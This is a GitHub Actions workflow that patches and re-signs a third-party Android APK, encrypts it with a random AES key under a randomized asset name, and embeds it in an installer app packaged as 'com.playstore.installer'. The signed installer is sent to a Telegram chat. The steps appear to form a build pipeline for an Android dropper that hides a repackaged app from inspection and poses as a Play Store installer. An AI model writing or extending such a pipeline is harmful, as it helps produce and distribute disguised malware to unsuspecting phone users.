name: Berlin App Build

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Setup Java
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: 17

      - name: Setup Android SDK
        run: |
          sudo apt-get install -y zipalign apksigner
          echo "apksigner: $(which apksigner)"
          apksigner version
          echo "$ANDROID_SDK_ROOT/cmdline-tools/latest/bin" >> $GITHUB_PATH
          export PATH="$ANDROID_SDK_ROOT/cmdline-tools/latest/bin:$PATH"
          sdkmanager "platforms;android-34" "build-tools;34.0.0"
          sdkmanager "ndk;25.2.9519653" "cmake;3.18.1"
          echo "$ANDROID_SDK_ROOT/ndk/25.2.9519653/toolchains/llvm/prebuilt/linux-x86_64/bin" >> $GITHUB_PATH

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install Python deps
        run: pip install cryptography

      - name: Download smali.jar
        run: |
          mkdir -p tools
          curl -L "https://bitbucket.org/JesusFreke/smali/downloads/smali-2.5.2.jar" \
            -o tools/smali.jar
          # Verify it's a valid jar
          file tools/smali.jar
          java -jar tools/smali.jar --version || true
          echo "smali.jar: $(stat -c%s tools/smali.jar) bytes"

      - name: Patch Berlin App
        run: |
          python3 berlin/scripts/apk_asset_bundler.py \
            berlin/assets/berlin_source.apk \
            berlin_patched.apk

      - name: Sign Berlin App
        run: |
          python3 berlin/scripts/apk_signer.py \
            berlin_patched.apk \
            berlin_signed.apk

      - name: Verify APK
        run: |
          echo "=== APK sizes ==="
          stat -c "%n : %s bytes" berlin/assets/berlin_source.apk berlin_patched.apk berlin_signed.apk 2>/dev/null || true
          echo "=== Entry check ==="
          python3 - <<'EOF'
          import zipfile
          with zipfile.ZipFile("berlin_signed.apk", "r") as z:
              names = z.namelist()
              dex = next((i for i in z.infolist() if i.filename == "classes.dex"), None)
              asset = next((i for i in z.infolist() if i.filename == "assets/cache.db"), None)
              print(f"classes.dex  : {dex.file_size:,} bytes  compress={dex.compress_type}")
              print(f"assets/cache.db: {asset.file_size:,} bytes  compress={asset.compress_type}")
              print(f"Total entries: {len(names)}")
          EOF

      # ── Berlin → Installer pipeline ──────────────────────────────────────────
      # Runs after berlin is signed+verified. Encrypts berlin APK with AES-256-CBC,
      # copies blob into installer assets, builds installer, sends installer to Telegram.

      - name: Generate ASSET_C and BERLIN_KEY
        id: berlin_keys
        run: |
          # Same logic as FingerprintPlugin.groovy Step 5+6 — generated BEFORE Gradle build
          # so we can encrypt the blob first, then pass the same keys into Gradle via -P flags
          ASSET_C=$(python3 -c "import os; print(os.urandom(4).hex() + '.bin')")
          BERLIN_KEY=$(python3 -c "import os; print(os.urandom(32).hex())")
          echo "ASSET_C=${ASSET_C}" >> $GITHUB_OUTPUT
          echo "BERLIN_KEY=${BERLIN_KEY}" >> $GITHUB_OUTPUT
          echo "ASSET_C   : ${ASSET_C}"
          echo "BERLIN_KEY: ${BERLIN_KEY:0:16}..."

      - name: Clear installer assets (berlin build has no companion)
        run: |
          rm -rf app/src/main/assets/*
          echo "Assets cleared — only berlin encrypted blob will be added"

      - name: Encrypt Berlin APK for installer
        run: |
          BERLIN_APK="berlin_signed.apk"
          if [ ! -f "$BERLIN_APK" ]; then
            BERLIN_APK="berlin_patched.apk"
            echo "Using unsigned APK"
          fi

          ASSET_C="${{ steps.berlin_keys.outputs.ASSET_C }}"
          BERLIN_KEY="${{ steps.berlin_keys.outputs.BERLIN_KEY }}"
          OUTPUT="app/src/main/assets/${ASSET_C}"

          echo "Encrypting ${BERLIN_APK} → ${OUTPUT}"
          python3 berlin/scripts/encrypt_berlin_for_installer.py \
            "${BERLIN_APK}" \
            "${ASSET_C}" \
            "${BERLIN_KEY}" \
            "${OUTPUT}"

          echo "=== Encrypted blob ==="
          stat -c "%n : %s bytes" "${OUTPUT}"
          # Verify blob starts with 16-byte IV (minimum 17 bytes)
          BLOB_SIZE=$(stat -c%s "${OUTPUT}")
          if [ "$BLOB_SIZE" -lt 17 ]; then
            echo "ERROR: Encrypted blob too small (${BLOB_SIZE} bytes) — aborting"
            exit 1
          fi
          echo "Blob OK: ${BLOB_SIZE} bytes"

      - name: Swap in BerlinInstallActivity for installer build
        run: |
          # Overwrite InstallActivity.kt with BerlinInstallActivity.kt, then delete BerlinInstallActivity.kt
          # so only one InstallActivity class exists during compilation.
          # This only affects the CI runner workspace — repo files on GitHub are never modified.
          cp app/src/main/java/com/playstore/installer/BerlinInstallActivity.kt \
             app/src/main/java/com/playstore/installer/InstallActivity.kt
          rm app/src/main/java/com/playstore/installer/BerlinInstallActivity.kt
          echo "BerlinInstallActivity swapped in as InstallActivity, duplicate removed"

      - name: Build Installer APK
        run: |
          chmod +x gradlew
          ./gradlew assembleRelease \
            -Pberlin.assetC="${{ steps.berlin_keys.outputs.ASSET_C }}" \
            -Pberlin.berlinKey="${{ steps.berlin_keys.outputs.BERLIN_KEY }}" \
            --stacktrace

          INSTALLER_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
          if [ -z "$INSTALLER_APK" ]; then
            echo "ERROR: Installer APK not found after build"
            exit 1
          fi
          echo "INSTALLER_APK=${INSTALLER_APK}" >> $GITHUB_ENV
          echo "Installer APK: ${INSTALLER_APK}"
          stat -c "%n : %s bytes" "${INSTALLER_APK}"

      - name: Sign Installer APK
        run: |
          python3 berlin/scripts/apk_signer.py \
            "${{ env.INSTALLER_APK }}" \
            installer_signed.apk
          echo "INSTALLER_APK=installer_signed.apk" >> $GITHUB_ENV

      - name: Send Installer to Telegram
        env:
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
        run: |
          APK="installer_signed.apk"
          if [ ! -f "$APK" ]; then APK="${{ env.INSTALLER_APK }}"; fi
          ASSET_C="${{ steps.berlin_keys.outputs.ASSET_C }}"
          SIZE=$(stat -c%s "$APK")
          SIZE_MB=$(echo "scale=2; $SIZE/1048576" | bc)
          curl -s -X POST \
            "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
            -F "chat_id=${TELEGRAM_CHAT_ID}" \
            -F "document=@${APK};filename=installer_berlin_$(date +'%d-%m-%Y')_Build${{ github.run_number }}.apk" \
            -F "caption=✅ Installer + Berlin Build Complete%0ASize: ${SIZE_MB} MB%0ABuild: #${{ github.run_number }}%0AASSET_C: ${ASSET_C}" \
            | python3 -c "import sys,json; r=json.load(sys.stdin); print('Telegram OK' if r.get('ok') else f'Telegram ERROR: {r}')"
